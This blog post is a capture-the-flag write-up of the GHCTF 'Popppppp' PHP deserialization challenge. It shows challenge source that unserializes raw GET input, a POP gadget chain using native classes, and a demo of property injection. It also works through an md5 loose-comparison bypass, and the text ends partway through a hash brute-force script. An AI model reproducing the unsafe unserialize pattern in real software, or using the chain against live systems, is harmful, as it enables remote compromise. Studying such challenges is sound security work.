---
layout: post
title: "ctf-web-php原生类利用-GHCTF-Popppppp"
date: 2025-03-11 21:27:39 +0800
description: "是 PHP 中一个用于对数组中的每个元素应用回调函数的函数。该函数的基本用法是遍历数组，并对每个元素调用用户自定义的回调函数，回调函数可以修改数组元素的值。类的子类，用于遍历符合特定模式的文件系统路径。（Standard PHP Library）库的一部分，它提供了一个面向对象的方式来处理文件操作。用于表示一个文件，并允许你以面向对象的方式进行文件读取、写入、修改等操作。函数的，它允许你在文件系统中查找符合给定模式的文件。类，因此你可以用它来获取文件的基本信息（如文件名、路径、大小等）。"
keywords: "ctf-web: php原生类利用 -- GHCTF Popppppp"
categories: ['未分类']
tags: ['网络安全', 'Php']
artid: "146189550"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146189550
    alt: "ctf-web-php原生类利用-GHCTF-Popppppp"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146189550
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146189550
cover: https://bing.ee123.net/img/rand?artid=146189550
image: https://bing.ee123.net/img/rand?artid=146189550
img: https://bing.ee123.net/img/rand?artid=146189550
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     ctf-web: php原生类利用 -- GHCTF Popppppp
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h2>
     <a id="_0">
     </a>
     源代码
    </h2>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>        
	    <span class="token variable">$newFunc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> <span class="token variable">$newFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Forbidden</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">private</span> <span class="token variable">$fruit3</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit3</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$var</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Warlord</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit4</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit5</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit4</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit5</span><span class="token operator">-&gt;</span><span class="token function">ll2</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Samurai</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit6</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit7</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$long</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit6</span><span class="token operator">-&gt;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> <span class="token variable">$long</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit7</span><span class="token operator">-&gt;</span><span class="token property">tt2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"xxx are the best!!!"</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">,</span> <span class="token variable">$day2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$day3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$day2</span><span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$day3</span> <span class="token keyword">as</span> <span class="token variable">$day4</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$day4</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Princess</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">protected</span> <span class="token variable">$fruit9</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">addMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"The time spent with xxx is my happiest time"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit9</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$func</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"Me"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"sr22kaDugamdwTPhG5zU"</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit11</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">666</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">-&gt;</span><span class="token property">hey</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessTwo</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$hiddenVar</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123123"</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hiddenVar</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hiddenVar</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Warrior</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit12</span><span class="token punctuation">;</span>  
    <span class="token keyword">private</span> <span class="token variable">$fruit13</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit13</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessThree</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$dummyVar</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">return</span> <span class="token variable">$name</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessFour</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$lalala</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hehe"</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>
</code></pre>
    <h2>
     <a id="step_1__148">
     </a>
     step 1 找利用点
    </h2>
    <p>
     翻找全部类发现没有可控任意函数执行点,但是能发现一个很特别的类
    </p>
    <pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">,</span> <span class="token variable">$day2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token variable">$day3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$day2</span><span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$day3</span> <span class="token keyword">as</span> <span class="token variable">$day4</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$day4</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token punctuation">}</span>  
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>
</code></pre>
    <h3>
     <a id="array_walk_166">
     </a>
     array_walk()
    </h3>
    <p>
     <code>
      array_walk
     </code>
     是 PHP 中一个用于对数组中的每个元素应用回调函数的函数。该函数的基本用法是遍历数组，并对每个元素调用用户自定义的回调函数，回调函数可以修改数组元素的值。
    </p>
    <h4>
     <a id="_170">
     </a>
     语法
    </h4>
    <pre><code class="prism language-php"><span class="token keyword type-declaration">bool</span> <span class="token function">array_walk</span> <span class="token punctuation">(</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$array</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$userdata</span> <span class="token operator">=</span> <span class="token constant">NULL</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span>
</code></pre>
    <ul>
     <li>
      <code>
       $array
      </code>
      ：输入的数组，必须是引用传递（&amp;）。
     </li>
     <li>
      <code>
       $callback
      </code>
      ：用户自定义的回调函数，函数名称或匿名函数。
     </li>
     <li>
      <code>
       $userdata
      </code>
      ：可选参数，用户自定义的数据，这个数据会作为第三个参数传递给回调函数。
     </li>
    </ul>
    <blockquote>
     <p>
      但是Mystery是没有属性的,这里要展示一个php反序列化的特性
     </p>
    </blockquote>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello World!'</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">,</span> <span class="token variable">$day2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token variable">$day3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$day2</span><span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$day3</span> <span class="token keyword">as</span> <span class="token variable">$day4</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$day4</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token punctuation">}</span>  
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mystery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     先序列化这段代码,得到输出,再尝试下面这段代码
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$echo</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">echo</span> <span class="token variable">$echo</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">,</span> <span class="token variable">$day2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token variable">$day3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$day2</span><span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$day3</span> <span class="token keyword">as</span> <span class="token variable">$day4</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$day4</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token punctuation">}</span>  
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:7:"Mystery":1:{s:4:"test";s:12:"Hello World!";}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span><span class="token operator">-&gt;</span><span class="token property">inexistent</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     你将能看到Mystery获得了本不属于他的
     <code>
      $test = 'Hello World!'
     </code>
     ,并调用了test类输出了
     <code>
      Hello World!
     </code>
     <br/>
     我将在之后讲述如何继续利用,在这之前先让我们寻找可用的pop链
    </p>
    <h2>
     <a id="step_2__230">
     </a>
     step 2 寻找反序列化链
    </h2>
    <p>
     我们要向上寻找能调用其不存在属性的类
    </p>
    <blockquote>
     <p>
      注意这个类是不行的,因为
      <code>
       __set
      </code>
      与
      <code>
       __get
      </code>
      作用是相似的,如果
      <code>
       __set
      </code>
      能触发,那么
      <code>
       __get
      </code>
      也能触发
     </p>
    </blockquote>
    <p>
     <code>
      $this-&gt;fruit7-&gt;tt2
     </code>
    </p>
    <pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Samurai</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$fruit6</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit7</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token variable">$long</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit6</span><span class="token operator">-&gt;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> <span class="token variable">$long</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit7</span><span class="token operator">-&gt;</span><span class="token property">tt2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"xxx are the best!!!"</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>
</code></pre>
    <blockquote>
     <p>
      所以只能考虑这个类
     </p>
    </blockquote>
    <p>
     <code>
      $this-&gt;fruit7-&gt;tt2
     </code>
    </p>
    <pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"sr22kaDugamdwTPhG5zU"</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit11</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">666</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">-&gt;</span><span class="token property">hey</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>
</code></pre>
    <blockquote>
     <p>
      tips: 在 PHP 中，
      <code>
       '666abc' == 666
      </code>
      <strong>
       为真
      </strong>
     </p>
    </blockquote>
    <p>
     编写python脚本找到一个经过两次md5后开头为666的字符串
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> hashlib

<span class="token keyword">def</span> <span class="token function">md5_hash</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""返回给定文本的MD5哈希值（小写十六进制形式）"""</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">find_string_with_double_md5</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""查找经过两次MD5哈希后，哈希值前缀为指定前缀的字符串"""</span>
    num <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token comment"># 第一次 MD5 哈希</span>
        first_hash <span class="token operator">=</span> md5_hash<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># 第二次 MD5 哈希</span>
        second_hash <span class="token operator">=</span> md5_hash<span class="token punctuation">(</span>first_hash<span class="token punctuation">)</span>
        <span class="token comment"># 检查第二次哈希值的前缀</span>
        <span class="token keyword">if</span> second_hash<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>
